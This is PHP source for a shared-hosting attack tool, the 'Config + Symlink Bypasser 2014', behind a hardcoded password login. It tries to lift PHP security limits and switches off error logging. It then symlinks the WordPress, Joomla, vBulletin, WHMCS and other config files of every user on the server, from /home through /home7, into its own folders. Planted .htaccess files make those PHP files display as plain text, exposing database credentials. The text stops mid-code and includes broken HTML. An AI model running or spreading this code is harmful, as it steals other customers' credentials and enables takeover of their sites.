?><?

//Change User & Password

$tacfgd['uname'] = 'prodigy-tn';
$tacfgd['pword'] = 'prodigy-tn';


// Title of page.
$tacfgd['title'] = 'By Prodigy TN';

// Text to appear just above login form.
$tacfgd['helptext'] = 'Login to Script';


// Set to true to enable the optional remember-me feature, which stores encrypted login details to 
// allow users to be logged-in automatically on their return. Turn off for a little extra security.
$tacfgd['allowrm'] = true;

// If you have multiple protected pages, and there's more than one username / password combination, 
// you need to group each combination under a distinct rmgroup so that the remember-me feature 
// knows which login details to use.
$tacfgd['rmgroup'] = 'default';

// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. 
// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not 
// destroy the session, so that is left up to you.
$tacfgd['ownsessions'] = false;




foreach ($tacfgd as $key => $val) {
  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
}

if (!$tacfg['ownsessions']) {
  session_name('txtauth');
  session_start();
}

// Logout attempt made. Deletes any remember-me cookie as well
if (isset($_GET['logout']) || isset($_POST['logout'])) {
  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
  if (!$tacfg['ownsessions']) {
    $_SESSION = array();
    session_destroy();
  }
  else $_SESSION['txtauthin'] = false;
}
// Login attempt made
elseif (isset($_POST['login'])) {
  if ($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword']) {
    $_SESSION['txtauthin'] = true;
    if ($_POST['rm']) {
      // Set remember-me cookie for 2 weeks
      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
    }
  }
  else $err = 'Login Faild !';
}
// Remember-me cookie exists
elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
    $_SESSION['txtauthin'] = true;
  }
  else $err = 'Login Faild !';
}
if (!$_SESSION['txtauthin']) {
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
?>
<html dir=rtl>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title>Bypasser config/symlink 2014 by Prodigy TN</title>

<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #dadada;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #dadada;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #dadada;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #dadada;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #dadada;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #dadada;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';

<body>
<br><br><div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
<hr width="300" size="1" noshade color="#cdcdcd">
<p>
<div align="center" class="grey">
<?=$tacfg['helptext']?>
</div>
<p>
<?
if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
?>
<form name="txtauth" action="<?=$action?>" method="post">
<div align="center">
<table border="0" cellpadding="4" cellspacing="0" bgcolor="#666666" style="border: 1px double #dedede;" dir="ltr">
<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
<?if (isset($tacfg['uname'])) {?>
<tr><td>Username:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?}?>
<tr><td>Password:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?if ($tacfg['allowrm']) {?>
<tr><td align="left"><input type="submit" name="login" value="Login">
</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm"> 
  	Remember Me ?</label></td></tr>
<?} else {?>
<tr><td colspan="2" align="center">
  <input type="submit" name="login" value="Login"></td></tr>
<?}?>
</table>
</div>
</form>

<br><br>
<hr width="300" size="1" noshade color="#cdcdcd">
<div class="smalltxt" align="center">Maded By Prodigy_TN
	<p>prodigy_tn@hotmail.com</div>

<p>&nbsp;</p>

</body>
</html>
<?
  // Don't delete this!
  exit();
}
?>
<title>Bypasser config/symlink 2014 by Prodigy TN/title>

<style type="text/css">
body{
   margin : auto;
   background-color:#f6f6f6;
   color: #444444;
   font-family: tahoma, geneva, lucida,lucida grande, arial, helvetica, sans-serif;
   font-family: 14px;
   text-align: center;
    font-weight: bold ;
}

input,textarea,select{
font-weight: bold;
color: #000000;
border: 1px solid #CCCCCC;
background-color: white;
padding: 3px;
border-radius: 7px;
}

input:focus{

 box-shadow: 0px 0px 5px #cc0000;

}
#footer  {

color: #000000;
font-family: 14px;
text-shadow: 0px 0px 1px #000000;
font-weight: normal;
}
a{
  text-decoration: none;
  c
<html>
<style type="text/css">
a{
	color: #ffffff;
	text-shadow: 0px 0px 3px #999999;
}
 </style>
<head>
<meta charset="utf-8">
<title>All In One By ICA</title>
<style>
body{
    background-color: #000000;
}
</style>
</head>

<body>
</body>
</html>
<center> <a href="http://www.gulfup.com/" target="_blank" title="&#1605;&#1585;&#1603;&#1586; &#1578;&#1581;&#1605;&#1610;&#1604; &#1575;&#1604;&#1589;&#1608;&#1585;">
<img src="http://im64.gulfup.com/I28GmN.png" border="0" alt="&#1605;&#1585;&#1603;&#1586; &#1578;&#1581;&#1605;&#1610;&#1604; &#1575;&#1604;&#1589;&#1608;&#1585;" width="397" height="248" /></a></a>
&nbsp;</style><div id="result">
<br />
<H1 style="color: #444444; text-shadow: 0px 0px 1px #444444";text-align: center;>
Config + Symlink Bypasser 2014 </H1>
</div>
<p dir='ltr' align='center'><font face='Verdana' size='2'>Coded By : 
<font color="#CC0000">Prodigy TN</font> <font> FB: <font color='#cc0000'>
www.facebook.com/prodigytn3</font></font></font><font color='#cc0000' face="Verdana" size="2"><center>
<table align='center' width='70%'><td>
<a href="?OPT=1">User + Domain + Sym</td></a><td><a href="?OPT=2">User + Sym</a></td></h3><td>
<a href="?OPT=3">Config ( Perl )</td></a><td>
<a href="?OPT=4">Config ( PHP )</td></a></table></center>

<?php

error_reporting(0);
ob_start();
 function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}
$dir = "sec1";
@mkdir($dir);
if($dir){
} else {
}
$dir2 = "sec2";
@mkdir($dir2);
if($dir2){
} else {
}
$dir3 = "sec3";
@mkdir($dir3);
if($dir3){
} else {
}
$dir4 = "sec4";
@mkdir($dir4);
if($dir4){
} else {
}
$dir5 = "sec5";
@mkdir($dir5);
if($dir5){
} else {
}
$dir6 = "sec6";
@mkdir($dir6);
if($dir6){
} else {
}
$dir7 = "sec7";
@mkdir($dir7);
if($dir7){
} else {
}



$sec1 = "sec1/.htaccess";
$hsec1 = fopen($sec1, 'w') or die("Error: Can't open file");
$con1 = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
AddType txt .html
AddHandler txt .html
Options all
Options
Allow from all
Require None
Satisfy Any";
fwrite($hsec1, $con1);
fclose($hsec1);



$sec2 = "sec2/.htaccess";
$hsec2 = fopen($sec2, 'w') or die("Error: Can't open file");
$con2 = "Options +FollowSymLinks
DirectoryIndex seees.html
RemoveHandler .php
AddType application/octet-stream .php ";
fwrite($hsec2, $con2);
fclose($hsec2);


$sec3 = "sec3/.htaccess";
$hsec3 = fopen($sec3, 'w') or die("Error: Can't open file");
$con3 = "Options +FollowSymLinks
DirectoryIndex Index.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php";
fwrite($hsec3, $con3);
fclose($hsec3);

$sec4 = "sec4/.htaccess";
$hsec4 = fopen($sec4, 'w') or die("Error: Can't open file");
$con4 = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php";
fwrite($hsec4, $con4);
